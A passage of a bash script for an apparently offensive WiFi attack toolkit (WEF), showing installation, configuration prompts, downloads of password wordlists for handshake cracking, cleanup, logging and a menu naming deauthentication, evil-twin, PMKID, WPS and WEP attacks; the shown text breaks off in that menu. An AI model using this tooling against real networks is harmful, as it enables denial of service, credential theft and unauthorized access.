#!/bin/bash

#
# WEF - WiFi Exploitation Framework
# Website: https://d3ext.github.io/
# Mail: <d3ext@proton.me>
# Github: https://github.com/D3Ext
#

# Define general variables

export program_version="1.5"
export wef_path="/usr/share/wef"
export cache_path="${wef_path}/cache"
export output_path="${wef_path}/output"
export reports_path="${wef_path}/reports"
export graphs_path="${wef_path}/graphs"
export pwnagotchi_path="${wef_path}/pwnagotchi"
export wordlists_path="${wef_path}/wordlists"
export portals_path="${wef_path}/captive-portals"
export wacker_path="${wef_path}/wacker"
export evil_twin_path="${cache_path}/www"
export config_file="${wef_path}/wef.cnf"

parameters=("$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" "$9")
export lang="en"

config_lang=$(awk -F '=' '/lang/ {print $2}' ${config_file} 2>/dev/null | sed 's/#.*//' | tr -d " ")
if [ "$config_lang" == "es" ]; then
  lang="es"
else
  lang="en"
fi

# Define colors and formats
redC=$(tput setaf 1)
greenC=$(tput setaf 2)
yC=$(tput setaf 3)
blueC=$(tput setaf 4)
purpleC=$(tput setaf 5)
cyanC=$(tput setaf 6)
grayC=$(tput setaf 7)
errorC="$(tput setab 1)$(tput setaf 7)"
endC=$(tput sgr0)

monitor_mode_needed_functions=("1" "2" "3" "4" "5" "6" "7" "8" "9" "10" "11" "12" "13" "14" "15" "16" "17" "18" "deauth" "deauthentication" "wids" "confusion" "auth" "authentication" "beacon" "beacon flood" "michael" "tkip" "pixie" "pixiedust" "brute" "null" "nullpin" "replay" "arp" "hirte" "caffelatte" "caffe latte" "fake" "passive" "pmkid" "pwnagotchi" "evil" "eviltwin" "auto" "autopwn" "wpa3" "scan" "mac" "random" "randomize")

regulatory_domains_list="00;AD;AE;AF;AI;AL;AM;AN;AR;AS;AT;AU;AW;AZ;BA;BB;BD;BE;BF;BG;BH;BL;BM;BN;BO;BR;BS;BT;BY;BZ;CA;CF;CH;CI;CL;CN;CO;CR;CU;CX;CY;CZ;DE;DK;DM;DO;DZ;EC;EE;EG;ES;ET;FI;FM;FR;GB;GD;GE;GF;GH;GL;GP;GR;GT;GU;GY;HK;HN;HR;HT;HU;ID;IE;IL;IN;IR;IS;IT;JM;JO;JP;KE;KH;KN;KP;KR;KW;KY;KZ;LB;LC;LI;LK;LS;LT;LU;LV;MA;MC;MD;ME;MF;MH;MK;MN;MO;MP;MQ;MR;MT;MU;MV;MW;MX;MY;NG;NI;NL;NO;NP;NZ;OM;PA;PE;PF;PG;PH;PK;PL;PM;PR;PT;PW;PY;QA;RE;RO;RS;RU;RW;SA;SE;SG;SI;SK;SN;SR;SV;SY;TC;TD;TG;TH;TN;TR;TT;TW;TZ;UA;UG;US;UY;UZ;VC;VE;VI;VN;VU;WF;WS;YE;YT;ZA;ZW;"

# Replace clean command with a custom approach to keep scrollback buffer
function clear_screen(){
  printf '\33[H\33[2J'
}

# Check dependencies to work with the least possible tools
function check_dependencies(){
  if [ "$lang" == "en" ]; then
    info "Checking installed tools and requirements..."
  else
    info "Comprobando herramientas instaladas y requisitos..."
  fi; sleep 0.2

  main_tools=(ip iw macchanger aircrack-ng airmon-ng aireplay-ng airodump-ng mdk4 reaver wash xterm awk sed jq lspci locate column curl ps)
  for program in "${main_tools[@]}"; do
    if [ ! "$(command -v $program)" ]; then
      tools_missing="true"

      if [ "$x" != "true" ]; then
        echo
        x="true"
      fi

      if [ "$lang" == "en" ]; then
        warning "${program} not installed"
      else
        warning "${program} no instalado"
      fi; sleep 0.05
    fi
  done

  if [ "$tools_missing" == "true" ]; then
    echo
    if [ "$lang" == "en" ]; then
      status "Install necessary requirements before using this tool"
    else
      status "Instala los requisitos necesarios antes de usar esta herramienta"
    fi

    exit 1
  else
    sleep 0.5
  fi
}

# Check if the provided tools are installed. In case on of them is not, tools_missing will be set to true
function check_tools(){
  echo
  tools_to_check=("$@")

  tools_missing="false"
  for i in "${tools_to_check[@]}"; do
    if [ ! "$(command -v ${i})" ]; then
      log_command_not_found "${i}"
      tools_missing="true"
    fi
  done
}

# Download the repository from Github as a ZIP file
function download_repo(){
  curl -LJO https://github.com/D3Ext/WEF/archive/main.zip &>/dev/null
  unzip WEF-main.zip &>/dev/null
  rm WEF-main.zip 2>/dev/null
  downloaded="true"
}

function run_setup(){
  status "Installing wef..."
  sleep 0.2

  mkdir "${wef_path}" \
  "${cache_path}" \
  "${wordlists_path}" \
  "${output_path}" \
  "${reports_path}" \
  "${graphs_path}" \
  "${pwnagotchi_path}" 2>/dev/null
  sleep 0.1

  # Download captive portals if they are not already on current directory
  if [ -d ".git" ] && [ -d "captive-portals" ]; then
    cp -r "captive-portals/" "${wef_path}" 2>/dev/null
  elif [ ! -d "captive-portals" ]; then
    download_repo

    cp -r WEF-main/captive-portals/ "${wef_path}/" 2>/dev/null
  fi

  sleep 0.1

  # Download wacker folder if it is not already on current directory (used on WPA3 attack)
  if [ -d ".git" ] && [ -d "src/wacker" ]; then
    cp -r "src/wacker/" "${wef_path}" 2>/dev/null
  elif [ ! -d "src/wacker" ]; then
    if [ "$downloaded" != "true" ]; then
      download_repo
    fi

    cp -r WEF-main/src/wacker "${wef_path}/" 2>/dev/null
  fi

  sleep 0.1

  if [ -d ".git" ] && [ -f "wef" ]; then
    cp wef "${wef_path}/wef"
    cp src/oui.txt "${wef_path}/" 2>/dev/null
  elif [ ! -f "wef" ]; then
    if [ "$downloaded" != "true" ]; then
      download_repo
    fi
    
    cp WEF-main/wef "${wef_path}/wef" 2>/dev/null
    cp WEF-main/oui.txt "${wef_path}/oui.txt" 2>/dev/null
  fi

  sleep 0.1

  ln -s "${wef_path}/wef" /usr/bin/wef 2>/dev/null
  chmod +x "${wef_path}/wef" /usr/bin/wef 2>/dev/null

  if [ "$downloaded" == "true" ]; then
    rm -rf WEF-main 2>/dev/null
  fi

  # Check if the wef config file exists
  if [ ! -f "${config_file}" ]; then
    info "Creating config file ${config_file}"
    sleep 0.5

    echo "# This is the default configuration file
# This file must be saved as ${config_file}

# Default lenguage to use. Values: en, es
lang=en

# Enable/disable verbose (recommended to be enabled)
verbose=true" > "${config_file}"
  fi

  success "WEF successfully installed on path, execute ${yC}wef${endC}"
}

function run_update(){
  rm /usr/bin/wef "${wef_path}/wef" 2>/dev/null

  run_setup &>/dev/null
}

function parse_config(){
  if [ "$lang" == "en" ]; then
    info "Parsing configuration file..."
  else
    info "Aplicando ajustes del archivo de configuracion..."
  fi

  verbose=$(awk -F "=" '/verbose/ {print $2}' ${config_file} | sed 's/#.*//' | tr -d " " | sed '/^$/d')
  frequency_band=$(awk -F "=" '/frequency_band/ {print $2}' ${config_file} | sed 's/#.*//' | tr -d " ")
  auto_enable_monitor=$(awk -F "=" '/auto_enable_monitor/ {print $2}' ${config_file} | sed 's/#.*//' | tr -d " ")
  auto_random_mac=$(awk -F "=" '/auto_random_mac/ {print $2}' ${config_file} | sed 's/#.*//' | tr -d " ")
  create_graph=$(awk -F "=" '/create_graph/ {print $2}' ${config_file} | sed 's/#.*//' | tr -d " ")
  airmon_check_kill=$(awk -F '=' '/airmon_check_kill/ {print $2}' ${config_file} | sed 's/#.*//' | tr -d " ")
  wpa_sec_key=$(awk -F "=" '/wpa_sec_key/ {print $2}' ${config_file} | sed 's/#.*//' | tr -d " ")

  if [ ! "$verbose" ] || [ ! "$frequency_band" ] || [ ! "$auto_enable_monitor" ] || [ ! "$auto_random_mac" ] || [ ! "$create_graph" ] || [ ! "$airmon_check_kill" ]; then

    echo
    if [ "$lang" == "en" ]; then
      info "This is the first time you run wef, let's change some configuration parameters. You can make changes later this by editing ${config_file}"
    else
      info "Esta es la primera vez que usas wef, vamos a cambiar algunos parámetros de la configuración. Puedes hacer cambios más tarde editando ${config_file}"
    fi
  fi

  if [ ! "$verbose" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        input_no_line "Do you want to enable verbose? (yes/no) (default=yes): " verbose_option
      else
        input_no_line "¿Quieres activar el verbose? (si/no) (por defecto=si): " verbose_option
      fi

      content="$(cat "${config_file}" | grep -v "verbose=")"
      if [ "$verbose_option" == "y" ] || [ "$verbose_option" == "yes" ] || [ "$verbose_option" == "s" ] || [ "$verbose_option" == "si" ] || [ ! "$verbose_option" ]; then
        echo -e "${content}# Enable/disable verbose (recommended to be enabled)\nverbose=true" > "${config_file}"
        verbose="true"
        break
      elif [ "$verbose_option" == "n" ] || [ "$verbose_option" == "no" ] ; then
        echo -e "${content}# Enable/disable verbose (recommended to be enabled)\nverbose=false" > "${config_file}"
        verbose="false"
        break
      else
        log_invalid_option
      fi
    done
  fi

  # Config wifi band in which to scan APs
  if [ ! "$frequency_band" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        input_no_line "Do you want to scan nearby access points on 2.4GHz, 5GHz or autodetect? (2.4/5/auto) (default=auto): " scan_option
      else
        input_no_line "¿Quieres escanear los puntos de acceso cercano en 2.4GHz, 5GHz o detectar automáticamente? (2.4/5/auto) (por defecto=auto): " scan_option
      fi

      content="$(cat "${config_file}" | grep -v "frequency_band=")"
      if [ "$scan_option" == "2" ] || [ "$scan_option" == "2.4" ]; then
        echo -e "${content}\n\n# Wifi band in which to scan access points. Values: 2.4, 5, auto\nfrequency_band=2.4" > "${config_file}"
        frequency_band="2.4"
        break
      elif [ "$scan_option" == "5" ] ; then
        content="$(cat ${config_file} | grep -v "frequency_band=")"
        echo -e "${content}\n\n# Wifi band in which to scan access points. Values: 2.4, 5, auto\nfrequency_band=5" > "${config_file}"
        frequency_band="5"
        break
      elif [ "$scan_option" == "auto" ] || [ "$scan_option" == "autodetect" ] || [ ! "$scan_option" ]; then
        echo -e "${content}\n\n# Wifi band in which to scan access points. Values: 2.4, 5, auto\nfrequency_band=auto" > "${config_file}"
        frequency_band="auto"
        break
      else
        log_invalid_option
      fi
    done
  fi

  # enable monitor mode during launch
  if [ ! "$auto_enable_monitor" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        input_no_line "Do you want to enable monitor mode on each launch by default? (yes/no) (default=yes): " automon_option
      else
        input_no_line "¿Quieres activar por defecto el modo monitor en cada arranque? (si/no) (por defecto=si): " automon_option
      fi

      content="$(cat "${config_file}" | grep -v "auto_enable_monitor=")"
      if [ "$automon_option" == "y" ] || [ "$automon_option" == "yes" ] || [ "$automon_option" == "s" ] || [ "$automon_option" == "si" ] || [ ! "$automon_option" ]; then
        echo -e "${content}\n\n# Automatically enable monitor mode during launch\nauto_enable_monitor=true" > "${config_file}"
        auto_enable_monitor="true"
        break
      elif [ "$automon_option" == "n" ] || [ "$automon_option" == "no" ] ; then
        echo -e "${content}\n\n# Automatically enable monitor mode during launch\nauto_enable_monitor=false" > "${config_file}"
        auto_enable_monitor="false"
        break
      else
        log_invalid_option
      fi
    done
  fi

  # randomize MAC address during launch
  if [ ! "$auto_random_mac" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        input_no_line "Do you want to randomize the MAC address automataically? (yes/no) (default=yes): " auto_random_mac
      else
        input_no_line "¿Quieres randomizar la direccion MAC automaticamente? (si/no) (por defecto=si): " auto_random_mac
      fi

      content="$(cat "${config_file}" | grep -v "auto_random_mac=")"
      if [ "$auto_random_mac" == "y" ] || [ "$auto_random_mac" == "yes" ] || [ "$auto_random_mac" == "s" ] || [ "$auto_random_mac" == "si" ] || [ ! "$auto_random_mac" ]; then
        echo -e "${content}\n\n# Automatically randomize the MAC address during launch (this option requires auto_enable_monitor to be enabled)\nauto_random_mac=true" > "${config_file}"
        auto_random_mac="true"
        break
      elif [ "$auto_random_mac" == "n" ] || [ "$auto_random_mac" == "no" ] ; then
        echo -e "${content}\n\n# Automatically randomize the MAC address during launch (this option requires auto_enable_monitor to be enabled)\nauto_random_mac=false" > "${config_file}"
        auto_random_mac="false"
        break
      else
        log_invalid_option
      fi
    done
  fi

  # Detect auto graph creation
  if [ ! "$create_graph" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        input_no_line "Do you want to create a graph (using airgraph-ng) on each scan? (yes/no) (default=no): " graph_option
      else
        input_no_line "¿Quieres crear un gráfico (usando airgraph-ng) en cada escaneo? (si/no) (por defecto=no): " graph_option
      fi

      content="$(cat "${config_file}" | grep -v "create_graph=")"
      if [ "$graph_option" == "y" ] || [ "$graph_option" == "yes" ] || [ "$graph_option" == "s" ] || [ "$graph_option" == "si" ]; then
        echo -e "${content}\n\n# Create a graph of every single scan you perform using airgraph-ng to see found APs, their devices and the relationship between them\ncreate_graph=true" > "${config_file}"
        create_graph="true"
        break
      elif [ "$graph_option" == "n" ] || [ "$graph_option" == "no" ] || [ ! "$graph_option" ]; then
        echo -e "${content}\n\n# Create a graph of every single scan you perform using airgraph-ng to see found APs, their devices and the relationship between them\ncreate_graph=false" > "${config_file}"
        create_graph="false"
        break
      else
        log_invalid_option
      fi
    done
  fi

  # Config 'airmon check kill' which is useful for headless use and other things
  if [ ! "$airmon_check_kill" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        input_no_line "Do you want to execute \"airmon-ng check kill\" when enabling monitor mode? This will stop your active network connections so set it to \"no\" when using on headless setup. (yes/no) (default=yes): " kns_option
      else
        input_no_line "¿Quieres ejecutar \"airmon-ng check kill\" al activar el modo monitor? Esto cortará tus conexiones activas asi que elige \"no\" si usas un setup headless. (si/no) (por defecto=si): " kns_option
      fi

      content="$(cat "${config_file}" | grep -v "airmon_check_kill=")"
      if [ "$kns_option" == "y" ] || [ "$kns_option" == "yes" ] || [ "$kns_option" == "s" ] || [ "$kns_option" == "si" ] || [ ! "$kns_option" ]; then
        echo -e "${content}\n\n# Execute 'airmon check kill' when enabling monitor mode (disable it on headless devices)\nairmon_check_kill=true" > "${config_file}"
        airmon_check_kill="true"
        break
      elif [ "$kns_option" == "n" ] || [ "$kns_option" == "no" ] ; then
        echo -e "${content}\n\n# Execute 'airmon check kill' when enabling monitor mode (disable it on headless devices)\nairmon_check_kill=false" > "${config_file}"
        airmon_check_kill="false"
        break
      else
        log_invalid_option
      fi
    done
  fi

  # Add the empty field only the first time
  if [ ! "$wpa_sec_key" ] && [ ! "$(cat "${config_file}" | grep "wpa_sec_key=")" ]; then
    content="$(cat "${config_file}" | grep -v "wpa_sec_key=")"

    echo -e "${content}\n\n# WPA-SEC private key to upload and crack handshakes online (if you don't have one, obtain it here https://wpa-sec.stanev.org/)\nwpa_sec_key=" > "${config_file}"
  fi

  sleep 1
}

function parse_wordlists(){
  if [ "$lang" == "en" ]; then
    info "Locating wordlists used for cracking handshakes..."
  else
    info "Localizando los diccionarios para crackear handshakes..."
  fi

  rockyou_path="$(locate rockyou.txt | grep -E '/rockyou\.txt$' | head -n 1)"
  probable_wpa_path="$(locate probable-v2-wpa-top4800.txt | grep -E '/probable-v2-wpa-top4800\.txt$' | head -n 1)"
  dark2017_path="$(locate darkweb2017-top10000.txt | grep -E '/darkweb2017-top10000\.txt$' | head -n 1)"

  # Optional wordlists
  kaonashi_path="$(locate kaonashiWPA100M.txt | grep -E '/kaonashiWPA100M\.txt$' | head -n 1)"

  if [ ! "${rockyou_path}" ] || [ ! "${probable_wpa_path}" ] || [ ! "${dark2017_path}" ]; then
    if [ "$lang" == "en" ]; then
      warning "Some wordlists have not been found, proceeding with their installation..."
    else
      warning "No se han encontrado algunos diccionarios, procediendo con la instalación..."
    fi

    if [ ! -d "${wordlists_path}" ]; then
      mkdir ${wordlists_path}
    fi
  fi

  if [ ! "${rockyou_path}" ]; then
    curl -s -X GET "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz" -o "${wordlists_path}/rockyou.txt.tar.gz"
    tar -xvf ${wordlists_path}/rockyou.txt.tar.gz
    remove_file "${wordlists_path}/rockyou.txt.tar.gz"
  fi

  if [ ! "${probable_wpa_path}" ]; then
    curl -s -X GET "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt" -o "${wordlists_path}/probable-v2-wpa-top4800.txt"
  fi

  if [ ! "${dark2017_path}" ]; then
    curl -s -X GET "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/darkweb2017-top10000.txt" -o "${wordlists_path}/darkweb2017-top10000.txt"
  fi

  sleep 0.1
}

# Check if given PIDs are active to kill them
function kill_processes(){
  pids_to_kill=("$@")

  for pid in "${pids_to_kill[@]}"; do
    if [ "$(ps -p ${pid} | grep "${pid}")" ]; then
      kill -9 ${pid} 2>/dev/null; wait ${pid} 2>/dev/null
    fi
  done
}

# Kill all processes that may have been created during the different attacks
function kill_all_processes(){
  kill_processes $airodump_PID $aireplay_PID $mdk4_PID $hcx_PID $reaver_PID $passive_PID $hostapd_PID $dnsmasq_PID $lighttpd_PID $evil_twin_PID $evil_twin_deauth_PID
}

function kill_airodump_if_needed(){
  if [ "${c_h}" == "true" ]; then
    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null
  fi
}




#
# Functions used to catch Ctrl+C sigterm, to remove temporal files and to revert interface changes
#

# Main exit function
function exit_wef(){
  if [ "$(check_interface_mode)" == "monitor" ]; then
    while true; do
      if [ "$lang" == "en" ]; then
        input_no_line "Do you want to disable monitor mode? (yes/no) (default=yes): " disable_opt
      else
        input_no_line "¿Quieres desactivar el modo monitor? (si/no) (por defecto=si): " disable_opt
      fi

      if [ "$disable_opt" == "y" ] || [ "$disable_opt" == "yes" ] || [ "$disable_opt" == "s" ] || [ "$disable_opt" == "si" ] || [ ! "$disable_opt" ]; then
        disable_mon
        break
      elif [ "$disable_opt" == "n" ] || [ "$disable_opt" == "no" ]; then
        break
      elif [ "$disable_opt" != "n" ] && [ "$disable_opt" != "no" ]; then
        log_invalid_option
      fi
    done
  fi

  # Kill all created processes (in case they are still active or something weird has happened)
  kill_all_processes

  wpa_process="$(pgrep -x "wpa_supplicant")"
  net_process="$(pgrep -x "NetworkManager")"

  if [ ! "${wpa_process}" ] || [ ! "${net_process}" ]; then
    if [ "$lang" == "en" ]; then
      info "Restarting connections"
    else
      info "Restableciendo conexiones"
    fi
  fi

  if [ ! "${wpa_process}" ]; then
    systemctl restart wpa_supplicant 2>/dev/null
  fi

  if [ ! "${net_process}" ]; then
    systemctl restart NetworkManager 2>/dev/null
  fi

  # Restore Evil Twin changes
  restore_templates_evil_twin

  if [ "$lang" == "en" ]; then
    warning "Exiting..."
  else
    warning "Saliendo..."
  fi

  # Remove BSPWM custom rule
  if [ "$(pgrep -x "bspwm")" ]; then
    bspc rule -r XTerm
  fi

  # Remove capture files
  rm ${cache_path}/$(date +"%Y")-* 2>/dev/null

  # Remove the temporal directory
  rm -rf "${evil_twin_path}" 2>/dev/null

  exit 0
}

# Exit function for the Evil Twin attack
function exit_evil_twin(){
  # Kill created processes
  if [ "$lang" == "en" ]; then
    warning_ln "Stoping created processes..."
  else
    warning_ln "Parando los procesos iniciados..."
  fi

  killall dhcp &>/dev/null

  # Kill launched processes (if they are active)
  kill_processes $hostapd_PID $dnsmasq_PID $lighttpd_PID $evil_twin_PID $evil_twin_deauth_PID

  sleep 0.3

  # Force killing hostapd processes because they may not finish properly so for example some results may not be saved
  killall hostapd hostapd-wpe 2>/dev/null

  systemctl restart systemd-resolved &>/dev/null

  # Remove the temporal directory
  rm -rf "${evil_twin_path}" 2>/dev/null

  # Reconfigure the network adapter
  if [ "$lang" == "en" ]; then
    info "Reconfiguring the network interface..."
  else
    info "Reconfigurando la interfaz de red..."
  fi

  # Reconfigure back the network interface
  restore_interface_evil_twin

  # Save hostapd-wpe output
  if [ -f "hostapd-wpe.log" ]; then
    mv hostapd-wpe.log "${cache_path}/hostapd-wpe.log"
  fi
}

# Exit function for cracking processes
function exit_crack(){
  kill_processes $aircrack_PID $john_PID $hashcat_PID
}




#
# Functions used to catch Ctrl+C sigterm, to remove temporal files and to revert interface changes
#

function ctrl_c(){
  kill_processes $airodump_PID $aireplay_PID $mdk4_PID

  echo
  if [ "$lang" == "en" ]; then
    input_no_line "Ctrl+C detected, do you want to exit this tool? (yes/no) (default=yes): " exit_status
  else
    input_no_line "Ctrl+C detectado, ¿quieres salir de esta herramienta? (si/no) (por defecto=si): " exit_status
  fi

  if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ] || [ ! "${exit_status}" ]; then
    exit_wef
  elif [ "$exit_status" == "n" ] || [ "$exit_status" == "no" ]; then
    if [[ $input == 1 ]]; then
      main_menu
    fi
  else
    ctrl_c
  fi
}

function ctrl_c_pwnagotchi(){
  if [ "$lang" == "en" ]; then
    warning_ln "Stoping Pwnagotchi mode and returning to the main menu..."
  else
    warning_ln "Parando el modo Pwnagotchi y volviendo al menu principal..."
  fi; sleep 0.75

  stop_pwnagotchi="true"
}

function ctrl_c_evil_twin(){
  echo
  if [ "$lang" == "en" ]; then
    input_no_line "Ctrl+C detected, do you want to exit this tool? (yes/no): " exit_status
  else
    input_no_line "Ctrl+C detectado, ¿quieres salir de esta herramienta? (si/no): " exit_status
  fi

  if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ]; then
    exit_evil_twin
    exit 0
  elif [ "$exit_status" == "n" ] || [ "$exit_status" == "no" ]; then
    return
  else
    log_invalid_option
    ctrl_c_evil_twin
  fi
}



#
# Logging functions to avoid repeating code
#

function banner(){
  echo -e "${yC}██╗    ██╗███████╗███████╗ "
  echo -e "██║    ██║██╔════╝██╔════╝ "
  echo -e "██║ █╗ ██║█████╗  █████╗   "
  echo -e "██║███╗██║██╔══╝  ██╔══╝        ${blueC}WiFi Exploitation Framework ${yC}${program_version}"
  echo -e "╚███╔███╔╝███████╗██║      "
  echo -e " ╚══╝╚══╝ ╚══════╝╚═╝${endC}"
}

function banner2(){
  echo -e "${yC} __      _____ ___ "
  echo -e " \ \    / / __| __|"
  echo -e "  \ \/\/ /| _|| _| "
  echo -e "   \_/\_/ |___|_|  ${endC}"
}

#
# New logging functions
#

function success_ln(){
  echo -e "\n${greenC}[$(get_current_time)]${grayC} | ${greenC}SUCCESS${grayC} | ${1}${endC}"
}

function success(){
  echo -e "${greenC}[$(get_current_time)]${grayC} | ${greenC}SUCCESS${grayC} | ${1}${endC}"
}

function info_ln(){
  echo -e "\n${greenC}[$(get_current_time)]${grayC} | ${purpleC}INFO${grayC} | ${1}${endC}"
}

function info(){
  echo -e "${greenC}[$(get_current_time)]${grayC} | ${purpleC}INFO${grayC} | ${1}${endC}"
}

function status_ln(){
  echo -e "\n${greenC}[$(get_current_time)]${grayC} | ${cyanC}STATUS${grayC} | ${1}${endC}"
}

function status(){
  echo -e "${greenC}[$(get_current_time)]${grayC} | ${cyanC}STATUS${grayC} | ${1}${endC}"
}

function warning_ln(){
  echo -e "\n${greenC}[$(get_current_time)]${grayC} | ${yC}WARNING${grayC} | ${1}${endC}"
}

function warning(){
  echo -e "${greenC}[$(get_current_time)]${grayC} | ${yC}WARNING${grayC} | ${1}${endC}"
}

function failed_ln(){
  echo -e "\n${greenC}[$(get_current_time)]${grayC} | ${redC}FAILED${grayC} | ${1}${endC}"
}

function failed(){
  echo -e "${greenC}[$(get_current_time)]${grayC} | ${redC}FAILED${grayC} | ${1}${endC}"
}

function error_ln(){
  echo -e "\n${greenC}[$(get_current_time)]${grayC} | ${errorC}ERROR${grayC} | ${1}${endC}"
}

function error(){
  echo -e "${greenC}[$(get_current_time)]${grayC} | ${errorC}ERROR${grayC} | ${1}${endC}"
}

function input_no_line() {
  read -e -p "${greenC}[$(get_current_time)]${grayC} | ${blueC}INPUT${grayC} | ${1}${endC}" ${2}
}

function panel_option() {
  echo -e "${yC}${1} ${grayC}${2}${endC}"
}

function wef_prompt() {
  echo
  read -e -p "${greenC}[$(get_current_time)]${grayC} | ${yC}WEF${grayC} | >> ${endC}" option
}

function press_enter_attack(){
  echo
  if [ "$lang" == "en" ]; then
    input_no_line "Press [Enter] to continue and launch the attack " continue
  else
    input_no_line "Presiona [Enter] para continuar y lanzar el ataque " continue
  fi
}

function press_enter(){
  echo
  input_no_line "${1}"
}

# Create a simple progress bar with dots
function progress_bar(){
  echo -ne "${grayC}${3}"
  for ((i = 0; i <= ${1}; i++)); do
    echo -ne "."
    sleep ${2}
  done

  echo -e "${endC}"
}

function log_waiting_handshakes(){
  if [ "$lang" == "en" ]; then
    status_ln "Waiting while clients reconect to the AP in order to capture handshakes"
  else
    status_ln "Esperando mientras los clientes se reconectan al AP para capturar el handshake"
  fi
}

# This function is used when user selects an attack and monitor mode isn't enabled
function log_monitor_is_disabled(){
  echo
  if [ "$lang" == "en" ]; then
    status "Your network adapter interface is not in monitor mode."
    info "Please, before doing any operation use the ${cyanC}enable${grayC} command to enable monitor mode"
  else
    status "La interfaz de la tarjeta de red no está en modo monitor."
    info "Antes de realizar cualquier operación usa el comando ${cyanC}enable${grayC} para activar el modo monitor"
  fi
  clear_p=0
}

# Tell the user that the attack has been completed and a report was created
function log_completed(){
  if [ "$lang" == "en" ]; then
    status_ln "Attack has finished"; sleep 0.1
    info "An informative report has been created at ${reports_path}/${report_name}.html"
  else
    status_ln "Ataque completado"; sleep 0.1
    info "Se ha creado un reporte informativo en ${reports_path}/${report_name}.html"
  fi
}

function log_cracking_completed(){
  if [ "$lang" == "en" ]; then
    success "Cracking process completed"
  else
    success "Proceso de cracking completado"
  fi
}

function log_handshakes_not_found(){
  if [ "$lang" == "en" ]; then
    error_ln "Handshakes file not found\n"
  else
    error_ln "Archivo de handshakes no encontrado\n"
  fi
  
  sleep 1
}

function log_command_not_found(){
  if [ "$lang" == "en" ]; then
    info "${1} not installed"
  else
    info "${1} no instalado"
  fi
}

function log_invalid_option(){
  if [ "$lang" == "en" ]; then
    warning "Invalid option"
  else
    warning "La opción no es válida"
  fi
}

# Tell the user that he/she can type "back" and he/she will return to the main menu
function log_back_to_menu(){
  if [ "$lang" == "en" ]; then
    info_ln "Type ${cyanC}back${grayC} to return to the main menu"
  else
    info_ln "Escribe ${cyanC}back${grayC} para volver al menú principal"
  fi
}

function log_capture_files(){
  if [ "$lang" == "en" ]; then
    info "Network capture saved as ${output_path}/${ap_dir}/${cap_name}.cap"
  else
    info "Captura de red guardada como ${output_path}/${ap_dir}/${cap_name}.cap"
  fi
}

function log_attack_info(){
  clear_screen

  if [ "$lang" == "en" ]; then
    info "Attack information\n"
  else
    info "Información del ataque\n"
  fi

  if [ "$lang" == "en" ]; then
    echo -e "${grayC} Date: $(get_formatted_date)${endC}"
  else
    echo -e "${grayC} Fecha: $(get_formatted_date)${endC}"
  fi

  if [ "$essid" ]; then
    echo -e "${grayC} ESSID: ${essid}${endC}"
  fi

  if [ "$ap_bssid" ]; then
    echo -e "${grayC} BSSID: ${ap_bssid}${endC}"
  fi

  if [ "$channel" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${grayC} Channel: ${channel}${endC}"
    else
      echo -e "${grayC} Canal: ${channel}${endC}"
    fi
  fi

  if [ "$attack_time" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${grayC} Duration: ${attack_time}${endC}"
    else
      echo -e "${grayC} Duración: ${attack_time}${endC}"
    fi
  fi

  if [ "$frames_to_send" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${grayC} Frames: ${frames_to_send}${endC}"
    else
      echo -e "${grayC} Paquetes: ${frames_to_send}${endC}"
    fi
  fi

  if [ "${c_h}" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${grayC} Capture handshakes?: ${c_h}${endC}"
    else
      echo -e "${grayC} Capturar handshakes?: ${c_h}${endC}"
    fi
  fi

  if [ "$c_i" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${grayC} Capture IVs?: ${c_i}${endC}"
    else
      echo -e "${grayC} Capturar IVs?: ${c_i}${endC}"
    fi
  fi
}

function log_functions_info(){
  if [ "$lang" == "en" ]; then
    info_ln "You can find an explanation of every single attack in the official Wiki: https://github.com/D3Ext/WEF/wiki/Attacks"
  else
    info_ln "Puedes encontrar la explicación de cada ataque en la Wiki oficial: https://github.com/D3Ext/WEF/wiki/Attacks"
  fi
}


#
# Help panels functions
#

function help_panel(){
  echo -e "${yC} __      _____ ___ "
  echo -e " \ \    / / __| __|"
  echo -e "  \ \/\/ /| _|| _| "
  echo -e "   \_/\_/ |___|_|  "
  echo -e "\n${blueC}WiFi Exploitation Framework ${yC}${program_version}${endC}"

  list_interfaces # Show active interfaces (excluding the ethernet and loopback ones)

  if [ "$lang" == "en" ]; then
    echo -e "\n${blueC}Required parameters:${endC}"
    echo -e "\t${yC}-i, --interface)${blueC} \tThe name of your network adapter interface in managed mode${endC}"
    echo -e "\n${blueC}Optional parameters:${endC}"
    echo -e "\t${yC}-h, --help)${blueC} \t\tShow this help panel${endC}"
    echo -e "\t${yC}--version)${blueC} \t\tPrint the version and exit${endC}\n"
  else
    echo -e "\n${blueC}Parámetros requeridos:${endC}"
    echo -e "\t${yC}-i, --interface)${blueC} \tEl nombre de la interfaz de tu tarjeta de red en modo managed${endC}"
    echo -e "\n${blueC}Parámetros opcionales:${endC}"
    echo -e "\t${yC}-h, --help)${blueC} \t\tMuestra este panel de ayuda${endC}"
    echo -e "\t${yC}--version)${blueC} \t\tImprime por pantalla la versión actual del programa${endC}\n"
  fi
  exit 0
}

# Attacks panel
function attacks_panel(){
  echo
  if [ "$lang" == "en" ]; then
    echo -e "${blueC}--------${yC}DoS attacks${blueC}--------\t--------${yC}WEP attacks${blueC}---------\t-----${yC}Rogue AP attacks${blueC}----${endC}"
    echo -e "${blueC}[${yC}1${blueC}] Deauthentication attack\t[${yC}9${blueC}]  ARP Replay attack\t\t[${yC}16${blueC}] EvilTwin attack${endC}"
